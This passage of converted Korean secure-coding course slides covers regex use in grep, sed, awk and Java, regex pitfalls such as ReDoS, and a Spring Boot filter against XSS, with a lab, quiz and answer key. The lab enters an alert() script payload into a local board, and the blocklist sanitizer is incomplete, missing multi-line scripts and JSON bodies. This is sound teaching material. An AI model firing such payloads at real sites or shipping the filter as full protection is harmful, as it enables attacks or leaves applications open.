| `-l` | 패턴이 포함된 파일 이름만 출력 |
| `-w` | 단어 단위로 정확히 일치하는 것만 검색 |
| `-E` | 정규 표현식 활용 (확장 정규식) |

---

## [2-SLIDES] 4주차 2차시 p.7 · grep 명령어에서 정규식 사용
grep 명령어에서 정규식 사용
정규식을 활용한 grep 명령어 활용 예
(예시 1) log.txt 파일에서 “error” 또는 “warning” 이 포함된 줄 출력
$ grep –E "error|warning" log.txt
(예시 2) number.txt 파일에서 숫자로 시작하는 줄 만 출력
$ grep –E "^[0-9]+" number.txt
(예시 3) user.txt 파일에서 이메일 주소 패턴을 찾아서 출력
$ grep –E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" user.txt

---

## [2-SLIDES] 4주차 2차시 p.8 · sed 명령어에서 정규식 사용
sed 명령어에서 정규식 사용
sed 명령어
sed(Stream Editor)는 텍스트 파일을 수정하거나 필터링할 때 사용하는 강력한 스트림 편집기.
grep이 텍스트에서 특정 패턴을 찾는다면, sed는 텍스트를 수정(변경, 삭제, 추가 등)할 수 있는 도구이다.
sed 명령어 기본 사용법
sed [옵션] “명령어” 파일명
$ sed 's/apple/orange/' fruits.txt  fruits.txt 파일에서 첫번째 apple을 찾아서 orange로 변경해서 출력

---

## [2-SLIDES] 4주차 2차시 p.9 · sed 명령어에서 정규식 사용 — sed 명령어에서 자주 사용하는 명령어
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
sed 명령어에서 정규식 사용 — sed 명령어에서 자주 사용하는 명령어

| 명령어 | 설명 |
| --- | --- |
| `s/패턴/변경할 문자열/` | 문자열 바꾸기 |
| `d` | 특정된 라인 삭제 |
| `p` | 특정된 라인 전체 출력 |
| `a\` 텍스트 | 특정된 라인 다음에 지정한 텍스트 줄을 추가 |
| `i\` 텍스트 | 특정된 라인 앞에 지정한 텍스트 줄을 추가 |
| `c\` 텍스트 | 특정된 라인을 지정한 텍스트 줄로 변경 |

---

## [2-SLIDES] 4주차 2차시 p.10 · sed 명령어에서 정규식 사용
sed 명령어에서 정규식 사용
(예시 1) HTML 주석문 제거
$ sed -E –i.bak 's/.*?//g' index.html
(예시 2) IPv4 주소 마스킹
$ sed -E –i.bak 's/([0-9]{1,3}\.){3}[0-9]{1,3}/***.***.***.***/g' access.log
(예시 3) 전화번호 형식 통일
$ sed -E –i.bak 's/\b([0-9]{3})-?([0-9]{3,4})-?([0-9]{4})\b/\1-\2-\3/g' contact.txt

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
※ 예시 1 주의: sed(-E 포함)는 `*?` 같은 **게으른(lazy) 수량자를 지원하지 않아** `.*?`가 `.*`처럼 최대한 길게 매칭됩니다. 한 줄에 주석이 두 개 이상 있으면 첫 ``부터 마지막 ``까지 사이의 **본문까지 함께 지워집니다.** (실제 실행: ` a  x  b ` → 빈 줄) 이 슬라이드의 명령은 한 줄에 주석이 하나일 때만 의도대로 동작합니다.
※ 명령 안의 `–i.bak`은 슬라이드에서 긴 대시(–)로 인쇄됐습니다. 실제 입력은 `-i.bak`(하이픈)이어야 합니다. p.7의 `grep –E`도 마찬가지입니다.

---

## [2-SLIDES] 4주차 2차시 p.11 · awk 명령어에서 정규식 사용
awk 명령어에서 정규식 사용
awk 명령어
awk는 텍스트 데이터 처리와 분석을 위한 강력한 도구로, 특히 열(column) 단위 데이터 처리, 조건별 출력, 연산 등을 쉽게 수행
주로 로그 분석, CSV 파일 처리, 텍스트 필터링 등에 사용된다.
awk 명령어 기본 사용법
awk ‘패턴 {액션}’ 파일명
$ awk '{print $2}' data.txt  data.txt 파일의 두번째 컬럼 출력

---

## [2-SLIDES] 4주차 2차시 p.12 · awk 명령어에서 정규식 사용 — awk의 주요 변수
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
awk 명령어에서 정규식 사용 — awk의 주요 변수

| 변수 | 의미 | 설명 |
| --- | --- | --- |
| `$0` | Current Record | 현재 행 전체 |
| `$1, $2, ...` | Specific Record | 첫번째, 두번째, .. 컬럼값 |
| `NR` | Number of Records | 현재 줄 번호 (1부터 시작) |
| `NF` | Number of Fields | 현재 행의 컬럼 개수 |
| `FS` | Field Separator | 입력 필드 구분자 (기본값: 공백) |
| `OFS` | Output Field Separator | 출력 필드 구분자 (기본값: 공백) |
| `RS` | Record Separator | 입력 줄 구분자 (기본값: 개행 `\n`) |
| `ORS` | Output Record Separator | 출력 줄 구분자 (기본값: 개행 `\n`) |

---

## [2-SLIDES] 4주차 2차시 p.13 · awk 명령어에서 정규식 사용
awk 명령어에서 정규식 사용
(예시 1) 특정 도메인의 이메일 주소 추출
$ awk '/@example\.com$/ { print $0 }' users.txt
(예시 2) 숫자로만 이루어진 행을 제외하고 출력
$ awk '!/^[0-9]+$/ { print $0 }' data.txt
(예시 3) ERROR 또는 WARN으로 시작하는 로그 줄만 추출
$ awk '/^(ERROR|WARN)/ { print $1, $3 }' log.txt

---

## [2-SLIDES] 4주차 2차시 p.14 · 정규식 활용한 데이터 검증
정규식 활용한 데이터 검증
01 명령어에서 정규식 활용
02 프로그램에서 정규식 활용

---

## [2-SLIDES] 4주차 2차시 p.15 · 자바 프로그램에서 정규식 사용
자바 프로그램에서 정규식 사용
정규식을 다루는 주요 클래스
〮 Pattern : 정규식을 받아들여 패턴을 정의
〮 Matcher : 입력 문자열과 정의된 패턴을 비교하여 일치 여부 검사
〮 String의 .matches(), .replaceAll() : 간단한 작업을 정규식으로 처리
주요 용도
〮 특정 패턴이 포함된 문자열 찾기 (Pattern & Matcher)
〮 입력 검증 (이메일, 전화번호, 비밀번호 등)
〮 문자열 치환 및 필터링 (.replaceAll())

---

## [2-SLIDES] 4주차 2차시 p.16 · 자바 프로그램에서 정규식 사용
자바 프로그램에서 정규식 사용
1. 특정 패턴이 포함된 문자열 찾기

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
import java.util.regex.*;

public class RegexExample {
    public static void main(String[] args) {
        String text = "My email is user@example.com and my backup is admin@mail.com";
        String regex = "\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b";  // 이메일 패턴

        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(text);

        while (matcher.find()) {
            System.out.println("Found: " + matcher.group());
        }
    }
}
```

실행 결과: `Found: user@example.com` / `Found: admin@mail.com` (find()를 반복해 문장 속 이메일을 모두 찾음)

---

## [2-SLIDES] 4주차 2차시 p.17 · 자바 프로그램에서 정규식 사용
자바 프로그램에서 정규식 사용
2. 사용자 입력 검증

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
public class RegexValidation {
    public static void main(String[] args) {
        String email = "user@example.com";
        String phone = "010-1234-5678";

        System.out.println(email.matches("^[\w.%+-]+@[\w.-]+\.[a-zA-Z]{2,}$"));  // 이메일 검증
        System.out.println(phone.matches("^\d{3}-\d{3,4}-\d{4}$"));              // 전화번호 검증
    }
}
```

실행 결과: `true` / `true` (`matches()`는 문자열 **전체**가 패턴과 일치해야 true)

---

## [2-SLIDES] 4주차 2차시 p.18 · 자바 프로그램에서 정규식 사용
자바 프로그램에서 정규식 사용
3. 문자열 치환

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
public class RegexReplace {
    public static void main(String[] args) {
        String text = "My password is secret123";
        String censored = text.replaceAll("password is \w+", "password is ****");

        System.out.println(censored);
    }
}
```

실행 결과: `My password is ****`

---

## [2-SLIDES] 4주차 2차시 p.19 · 자바 프로그램에서 정규식 사용
자바 프로그램에서 정규식 사용
4. 패스워드 강도 검사 (최소 8자, 대소문자, 숫자 포함)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
import java.util.regex.*;

public class PasswordRegexTest {
    public static void main(String[] args) {
        // 정규식 패턴
        String passwordRegex = "^(?=.*[A-Z])(?=.*\d)(?=.*[a-z]).{8,}$";
        Pattern pattern = Pattern.compile(passwordRegex);

        // 테스트할 비밀번호 목록
        String[] testPasswords = {
            "Password123",   // 유효함
            "password",      // 대문자, 숫자 없음
            "PASSWORD123",   // 소문자 없음
            "Pass12",        // 8자 미만
            "SecureP@ssword1" // 유효함
        };

        // 정규식 테스트
        for (String password : testPasswords) {
            Matcher matcher = pattern.matcher(password);
            boolean isValid = matcher.matches();
            System.out.println("패스워드: " + password + " → " + (isValid ? "유효함 ☑" : "유효하지 않음 ✖"));
        }
    }
}
```

정규식 풀이: `(?=.*[A-Z])` 대문자 1개 이상 · `(?=.*\d)` 숫자 1개 이상 · `(?=.*[a-z])` 소문자 1개 이상 · `.{8,}` 전체 8자 이상 (앞의 셋은 **전방탐색**이라 위치를 소비하지 않고 조건만 검사)

실행 결과(같은 정규식으로 검증함): Password123 유효 / password 무효 / PASSWORD123 무효 / Pass12 무효 / SecureP@ssword1 유효

---

## [2-SLIDES] 4주차 2차시 p.20 · 정규식 사용 시 문제점
정규식 사용 시 문제점
1. 성능 문제
〮 정규식은 백트래킹(Backtracking)을 사용하여 패턴을 찾기 때문에 복잡한 정규식일수록 실행 속도가 느려 질 수 있음.
〮 특히 비효율적인 패턴(ex: .* 사용, 중첩된 그룹 등)은 지수적 시간 복잡도를 초래할 수 있음.
(비효율적인 정규식 예)
$ grep -E "(a+)+b" largefile.txt
a+가 여러 번 반복되면서 백트래킹이 많아져 속도가 느려짐.

---

## [2-SLIDES] 4주차 2차시 p.21 · 정규식 사용 시 문제점
정규식 사용 시 문제점
2. 과도한 매칭(Overmatching)
〮 정규식이 너무 많은 결과를 매칭하는 경우가 있음
〮 특히 .* 를 사용하면 예기치 않은 부분까지 매칭될 수 있음.
(과도한 매칭 예)
$ echo "<title>Example</title>" | grep -o "<.*>"
<title>태그 하나만 찾으려 했지만 모든 태그를 포함하는 부분을 찾음

---

## [2-SLIDES] 4주차 2차시 p.22 · 정규식 사용 시 문제점
정규식 사용 시 문제점
3. 예상치 못한 미매칭(Undermatching)
〮 정규식이 특정한 경우를 잡아내지 못하는 경우가 있음
〮 예를 들어, 공백, 특수문자, 대소문자 변형 등을 고려하지 않으면 중요한 데이터를 놓칠 수 있음
(미매칭 예)
$ grep -E "http://" urls.txt
https://example.com 은 매칭 되지 않음 “https?://” 정규식을 사용하면 http:// 와 https:// 모두 매칭 가능

---

## [2-SLIDES] 4주차 2차시 p.23 · 정규식 사용 시 문제점
정규식 사용 시 문제점
4. 정규식 가독성 문제( Readability Issues)
〮 정규식이 길어지면 읽기 어렵고 유지보수가 힘들어짐.
(가독성이 낮은 정규식 예)
\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b
이메일 주소를 찾는 정규식이지만 가독성이 떨어짐. 설명 주석을 추가하거나 구조적 표현을 사용해서 가독성을 개선할 수 있음

---

## [2-SLIDES] 4주차 2차시 p.24 · 정규식 사용 시 문제점
정규식 사용 시 문제점
5. 보안문제(ReDoS, Regular Expression Denial of Service)
〮 일부 정규식은 특정 입력에 대해 매우 느리게 동작하여 서비스거부(DoS) 공격을 유발 할 수 있음
〮 특히 .*, .+, (a|b|c|d|e|f)* 같은 패턴이 문제를 일으킬 수 있음.
(ReDoS 발생 가능 예)
echo "aaaaaaaaaaaaaaaaaaaaaX" | grep -E "^(a+)+X$"
(a+)+ 패턴은 백트래킹이 많아져 실행 시간이 길어짐.

---

## [2-SLIDES] 4주차 2차시 p.25 · 요약 정리
요약 정리
- 자바에서 정규식을 활용하는 주요 클래스로 Pattern, Matcher가 있다.
- 정규식의 패턴 매칭을 통해 문자열 검색 및 입력 검증이 가능하다.
- replaceAll()을 이용하여 문자열 치환이 가능하다.

---

## [2-SLIDES] 4주차 2차시 p.26 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지
안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 4주차 2차시 p.27 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 4주차 2차시 p.28 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 다음 리눅스 명령어 중 정규식을 활용할 수 없는 것은?
   1) grep　2) sed　3) ps　4) awk
2. 자바 프로그램에서 정규식을 받아들여 패턴을 정의하는데 사용하는 클래스명은?　(　　)
3. 다음 중 정규식 사용시 발생 가능한 문제점이 아닌것은?
   1) DDoS 보안문제　2) 미매칭 문제　3) 성능 문제　4) 과도한 매칭

---

## [2-SLIDES] 4주차 2차시 p.29 · 퀴즈 정답
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈 정답

1. **3) ps** — ps는 프로세스의 리스트를 보는 명령어이며, 자체적으로는 정규식을 지원하지 않습니다.
2. **( Pattern )**
3. **1) DDoS 보안 문제** — DDoS는 분산형 서비스 거부이며, 정규식으로 발생될 수 있는 보안 문제는 수많은 백트래킹으로 인한 성능저하를 일으키는 ReDoS 보안 문제임.

※ 정답 쪽의 3번 문제 문장("정규식 성능 저하의 원인이 아닌 것은?")이 퀴즈 쪽("정규식 사용시 발생 가능한 문제점이 아닌것은?")과 다르게 적혀 있습니다. 정답은 같습니다.

# [2-SLIDES] 4주차 3차시 — 정규식과 입력값 검증·XSS 필터
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · CORS/코어스/Cross-Origin/교차 출처

## [2-SLIDES] 4주차 3차시 p.1 · 정규식을 활용한 입력값 필터링
정규식을 활용한 입력값 필터링
01 입력값 필터 만들기

---

## [2-SLIDES] 4주차 3차시 p.2 · 학습 목표
학습 목표
정규식을 활용하여 입력값을 필터링 하는 필터를 구현한다
Spring Boot 프레임워크에 필터를 적용한다.
XSS 대응을 위한 필터를 적용하여 취약점을 제거한다.

---

## [2-SLIDES] 4주차 3차시 p.3 · 학습 내용
학습 내용
1. 정규식으로 입력값을 필터링 할 수 있는 필터 제작
2. SpringBoot 프레임워크에서 필터를 적용하여 입력값 필터링
3. XSS 취약점의 기본적인 이해 및 필터링 적용

---

## [2-SLIDES] 4주차 3차시 p.4 · 정규식을 활용한 입력값 필터링
정규식을 활용한 입력값 필터링
01 입력값 필터 만들기

---

## [2-SLIDES] 4주차 3차시 p.5 · 필터(Filter)란?
필터(Filter)란?
필터(Filter)란?
클라이언트의 HTTP 요청과 응답을 가로채어 특정 작업을 수행하는 서블릿 기반 컴포넌트. 웹 애플리케이션에서 보안, 로깅,
데이터 변환등의 작업을 수행할 때 사용
필터의 주요 역할
〮 요청/응답 로깅
〮 인증(Authentication) & 권한 검사(Authorization)
〮 CORS 처리(다른 도메인의 요청 허용 또는 차단)
〮 데이터 검증 & 변환(요청 데이터 가공 및 유효성 검사)
〮 응답변환(JSON,XML 등 특정형식으로 변경)
〮 보안강화(SQL Injection, XSS 등의 공격 방어)

---

## [2-SLIDES] 4주차 3차시 p.6 · Spring Boot Filter 구조
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
Spring Boot Filter 구조

[도식: Client → Filter → DispatcherServlet → (HandlerMapping / HandlerInterceptor → Handler ↔ Business Logic / ViewResolver / View) 순서로 요청이 흐르고 응답이 되돌아옴]

| 순서 | 구간 | 동작 |
| --- | --- | --- |
| ① | Client → **Filter** → DispatcherServlet | Request |
| ② | DispatcherServlet ↔ **HandlerMapping** | Request URI에 따른 Controller Mapping |
| ③ | DispatcherServlet → **HandlerInterceptor** → **Handler(Controller)** ↔ Business Logic | 요청한 내용 처리 |
| ④ | Handler → HandlerInterceptor → DispatcherServlet | 결과 + View 이름, ModelAndView 반환 |
| ⑤ | DispatcherServlet ↔ **ViewResolver** | View 이름을 통해 View Object 반환 |
| ⑥ | DispatcherServlet ↔ **View** | Model Object 렌더링 후 반환 |
| ⑦ | DispatcherServlet → Filter → Client | Response |

핵심: **Filter는 DispatcherServlet보다 바깥**(서블릿 컨테이너 단계)에서 요청·응답을 가로채고, HandlerInterceptor는 DispatcherServlet 안쪽(스프링 단계)에서 Controller 앞뒤를 가로챈다.

---

## [2-SLIDES] 4주차 3차시 p.7 · Spring Boot 에서 필터 구현 방법
Spring Boot 에서 필터 구현 방법
STEP1. 기본 필터 구현

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
public class CustomFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        System.out.println("Request URI: " + httpRequest.getRequestURI());

        // 다음 필터 또는 컨트롤러로 요청 전달
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
    }
}
```

(init → 필터 생성 시 1회, doFilter → 요청마다, destroy → 종료 시 1회. `chain.doFilter()`를 호출하지 않으면 요청이 컨트롤러까지 가지 않음)

---

## [2-SLIDES] 4주차 3차시 p.8 · Spring Boot 에서 필터 구현 방법
Spring Boot 에서 필터 구현 방법
STEP2. 필터를 Spring Boot 에 등록
(방법1) @Component를 사용하여 자동 등록

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
@Component
public class CustomFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        System.out.println("Request Method: " + httpRequest.getMethod());

        chain.doFilter(request, response);
    }
}
```

---

## [2-SLIDES] 4주차 3차시 p.9 · Spring Boot 에서 필터 구현 방법
Spring Boot 에서 필터 구현 방법
STEP2. 필터를 Spring Boot 에 등록
(방법2) FilterRegistrationBean을 사용하여 수동 등록(우선순위 지정이 필요한 경우)
FilterConfig

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
@Configuration
public class FilterConfig {

    @Bean
    public FilterRegistrationBean<CustomFilter> loggingFilter() {
        FilterRegistrationBean<CustomFilter> registrationBean = new FilterRegistrationBean<>();
        registrationBean.setFilter(new CustomFilter());
        registrationBean.addUrlPatterns("/api/*");   // 특정 URL 패턴에만 적용
        registrationBean.setOrder(1);                // 필터 실행 순서 지정 (낮을수록 먼저 실행)
        return registrationBean;
    }
}
```

---

## [2-SLIDES] 4주차 3차시 p.10 · Spring Security 와 기본 필터
Spring Security 와 기본 필터
Spring Security 사용 시 자동으로 보안 필터 적용
Spring Security에는 로그인, 인증, 권한체크 등을 처리하는 필터가 포함되어 있음.
DefaultSecurityConfig

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
@Configuration
public class DefaultSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()    // 모든 요청 인증 필요
            )
            .formLogin()     // 기본 로그인 폼 활성화
            .httpBasic();    // HTTP Basic 인증 활성화

        return http.build();
    }
}
```

---

## [2-SLIDES] 4주차 3차시 p.11 · 입력값 필터 만들기
입력값 필터 만들기
XSS (Cross-Site Scripting) 공격이란
게시판처럼 입력 내용 그대로 표출되는 곳에 악성 스크립트를 넣어, 서비스 이용자의 브라우저에서 실행되도록 하는 공격
XSS 공격 방어 전략
〮 사용자 입력값에서 위험한 패턴의 문자열을 필터링
〮 SpringBoot의 ServletFilter와 HttpServletRequestWrapper를 이용하여 모든 요청의 입력값을 가로챔
〮 입력값의 내용을 정규식으로 패턴을 확인하여 필터링 처리
웹 브라우저 XSSFilter XSSRequestWrapper Controller 웹 브라우저

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[흐름도] 웹 브라우저 → **XSSFilter** → **XSSRequestWrapper** → Controller → 웹 브라우저

---

## [2-SLIDES] 4주차 3차시 p.12 · 입력값 필터 만들기
입력값 필터 만들기
XSS 필터 구현
모든 HTTP Request를 XSSRequestWrapper로 감싸서 모든 요청 내용의 입력 값 필터링하도록 함
p043_XSSFilter.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지, p043_XSSFilter.java]

```java
package kr.co.openeg.lab.filter.xss;

import javax.servlet.*;          // (캡처에서 import 부분은 접혀 있음)

@Component
public class p043_XSSFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        chain.doFilter(new p043_XSSRequestWrapper(httpRequest), response);
    }
}
```

(요청 객체를 Wrapper로 감싸서 다음 단계로 넘기는 것이 핵심 — 이후 컨트롤러가 파라미터를 꺼낼 때마다 Wrapper의 sanitize가 적용됨)

---

## [2-SLIDES] 4주차 3차시 p.13 · 입력값 필터 만들기
입력값 필터 만들기
XSSRequestWrapper 구현
p043_XSSRequestWrapper.java
1) <script> 태그와 그 사이의 내용을 제거
2) onclick, onerror 등의 이벤트 핸들러 제거
3) javascript: 문자열 제거

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지, p043_XSSRequestWrapper.java]

```java
package kr.co.openeg.lab.filter.xss;

import javax.servlet.http.HttpServletRequest;   // (import 일부 접혀 있음)

public class p043_XSSRequestWrapper extends HttpServletRequestWrapper {

    public p043_XSSRequestWrapper(HttpServletRequest request) {
        super(request);
    }

    @Override
    public String getParameter(String name) {
        String value = super.getParameter(name);
        return (value != null) ? sanitize(value) : null;
    }

    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values != null) {
            for (int i = 0; i < values.length; i++) {
                values[i] = sanitize(values[i]);
            }
        }
        return values;
    }

    // XSS 공격 가능성이 있는 코드 제거
    private String sanitize(String input) {
        if (input == null) return null;
        String clean = input;
        // <script> 태그 제거
        clean = clean.replaceAll("(?i)<script.*?>.*?</script>", "");
        // onclick, onerror 등의 이벤트 핸들러 제거
        clean = clean.replaceAll("(?i)on\\w+\\s*=\\s*['\"][^'\"]*['\"]", "");
        // javascript: 문자열 제거
        clean = clean.replaceAll("(?i)javascript:", "");
        return clean;
    }
}
```

※ 이 코드는 p.14의 정책 (3)을 쓰고 있어 **여러 줄에 걸친** `<script>…</script>`는 지우지 못합니다(`.`가 줄바꿈과 매칭되지 않음). 실제 실행으로 확인: `"<script>\nalert(1)</script>"` → 그대로 남음. 정책 (4)처럼 `(?si)`로 `s` 플래그를 붙이면 지워집니다.
※ `getParameter`·`getParameterValues`만 걸러서, JSON 요청 본문(@RequestBody)이나 헤더로 들어오는 값에는 적용되지 않습니다.

---

## [2-SLIDES] 4주차 3차시 p.14 · 입력값 필터 만들기 — 정규식을 이용한 입력값 필터링 정책
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
입력값 필터 만들기 — 정규식을 이용한 입력값 필터링 정책

| 번호 | 정규식 | 의미·차이 |
| --- | --- | --- |
| (1) | `<script.*>.*</script>` | 탐욕(greedy) 매칭 — 첫 `<script`부터 **마지막** `</script>`까지 한꺼번에 지움 (사이의 정상 글도 함께 삭제됨) |
| (2) | `<script.*?>.*?</script>` | 게으른(lazy) 매칭 — script 블록을 하나씩 지움 |
| (3) | `(?i)<script.*?>.*?</script>` | (2) + 대소문자 무시 (`<SCRIPT>`, `<ScRiPt>`도 잡음) |
| (4) | `(?si)<script[^>]*>.*?</script>` | (3) + `s` 플래그(`.`가 줄바꿈도 매칭) — 여러 줄 스크립트까지 잡음. 태그 속성은 `[^>]*`로 `>` 전까지만 |
| (5) | `(?i)on\w+\s*=\s*['\"][^'\"]*['\"]` | `onclick="…"`, `onerror='…'` 같은 이벤트 핸들러 속성 제거 |
| (6) | `("(?i)javascript:` | `javascript:` URL 스킴 제거 (앞의 `("`는 코드에서 복사하다 딸려 온 것으로, 실제 정규식은 `(?i)javascript:`) |

실행으로 확인한 (1)·(2)의 차이: `<script>a</script>안녕<script>b</script>` → (1)은 빈 문자열, (2)는 `안녕`

---

## [2-SLIDES] 4주차 3차시 p.15 · LAB1 - 소스코드의 XSS 취약점 확인
LAB1 - 소스코드의 XSS 취약점 확인
1. 환경 구축한 LAB을 실행시켜 파이어폭스로 로그인
접속 URL : localhost:8000
로그인 계정 : test / qqq111
2. '게시판' 메뉴 진입
3. '쓰기' 버튼을 눌러 게시글 작성
4. 제목 부분에 아래와 같이 입력
스크립트 구문 외에는 아무 문자열이나 입력해도 됨
안녕하세요<script>alert('XSS!!');</script>
5. 화면 아래로 내려가 '확인' 버튼

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[브라우저 캡처: `localhost:8000/board/write` 게시글 작성 화면, 제목 칸(빨간 상자)에 `asfdasfds<script>alert('XSS!!');</script>`, 내용 칸에 `testtest`]

---

## [2-SLIDES] 4주차 3차시 p.16 · LAB1 - 소스코드의 XSS 취약점 확인
LAB1 - 소스코드의 XSS 취약점 확인
6. 게시판 목록 화면에서 해당 게시글 제목에 스크립트
내용이 보여짐
7. 해당 게시글을 클릭하면 스크립트가 동작하여 화면에
경고창이 나타남
XSS 취약점 있는 것이 확인됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[브라우저 캡처 2장]
1. 게시판 목록(`/board/list`): 제목 칸에 `asfdasfds<script>alert('XSS!!');</script>`가 글자 그대로 보임(빨간 상자), 작성자 테스트, 작성일 2025-02-25
2. 게시글 조회(`/board/view?idx=3`): 'localhost:8000 — XSS!!' 경고창이 뜸 → 스크립트가 실행됨

---

## [2-SLIDES] 4주차 3차시 p.17 · LAB2 - 소스코드에 XSS 필터 반영
LAB2 - 소스코드에 XSS 필터 반영
1. 서비스 실행 중이라면, 상단 ■ 버튼을 눌러 중지
2. STS의 좌측 Package Explorer에서
kr.co.openeg.lab을 찾아 마우스 오른쪽 버튼 클릭
3. New > Package 선택

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[STS 캡처: 상단 툴바의 ■(빨간 정지) 버튼(빨간 화살표) / Package Explorer의 `kr.co.openeg.lab` 우클릭(빨간 화살표) → **New** → **Package** (파란 상자)]

---

## [2-SLIDES] 4주차 3차시 p.18 · LAB2 - 소스코드에 XSS 필터 반영
LAB2 - 소스코드에 XSS 필터 반영
3. Java Package 창에서 Name 항목에
kr.co.openeg.lab.filter.xss 입력
4. Finish 버튼

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
['New Java Package' 창: Source folder `SecureCoding/src/main/java`, **Name: `kr.co.openeg.lab.filter.xss`**(빨간 상자) → [Finish](빨간 화살표)]

---

## [2-SLIDES] 4주차 3차시 p.19 · LAB2 - 소스코드에 XSS 필터 반영
LAB2 - 소스코드에 XSS 필터 반영
5. 폴더에서 XSS 필터 소스코드 2개를 선택한 후, 새롭게
생성하여 비어있는 패키지로 Drag & Drop
6. 파일 Import 방법으로 'Copy files' 선택한 후 OK버튼

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처: 탐색기 '4주차' 폴더의 파일 목록(p031_RegexExample, p032_RegexValidation, p033_RegexReplace, p034_PasswordRegex…, **p043_XSSFilter.java**, **p043_XSSRequestWrapper.java** 선택) → STS의 `kr.co.openeg.lab.filter.xss` 패키지로 드래그(빨간 화살표) → 'File Operation' 창에서 ◉ **Copy files** → [OK]]

---

## [2-SLIDES] 4주차 3차시 p.20 · LAB2 - 소스코드에 XSS 필터 반영
LAB2 - 소스코드에 XSS 필터 반영
7. 프로젝트 명에서 마우스 우측 클릭한 후
Maven > Update Project 실행
8. 빌드 완료 확인
